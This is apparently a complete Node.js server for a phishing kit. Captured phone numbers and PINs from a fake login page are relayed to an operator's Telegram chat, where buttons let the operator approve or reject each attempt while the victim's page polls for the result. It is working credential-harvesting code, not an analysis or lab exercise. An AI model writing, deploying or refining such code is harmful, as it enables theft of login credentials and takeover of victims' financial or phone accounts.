const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // FIX: ensures body parsing works properly
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/:page', (req, res) => {
    if (req.params.page.startsWith('api')) {
        return res.status(404).send("Not found");
    }

    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    const filePath = path.join(__dirname, 'public', file);

    res.sendFile(filePath, (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    if (!phone || !pin || !ADMIN_ID) {
        return res.status(400).json({ error: "Missing data" });
    }

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    statusStore[phone] = "pending";

    try {
        await bot.telegram.sendMessage(ADMIN_ID, `📱 <b>CL 2 - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Allow to proceed", callback_data: `approve_${phone}_${pin}` },
                    { text: "❌ Invalid credentials", callback_data: `deny_${phone}_${pin}` }
                ]]
            }
        });

        res.json({ success: true });
    } catch (err) {
        console.error(err); // FIX: log real error
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------

// FIX: safer regex (prevents breaking if phone has underscores)
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        const pin = ctx.match[2];

        statusStore[phone] = "approved";

        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Allowed");
    } catch (e) {
        console.error(e);
    }
});

bot.action(/deny_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];

        statusStore[phone] = "denied";

        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>INVALID CREDENTIALS</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Rejected");
    } catch (e) {
        console.error(e);
    }
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    if (!phone) return res.json({ status: "pending" });

    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
const startBot = async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
};

startBot();

// FIX: graceful stop (prevents crashes)
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
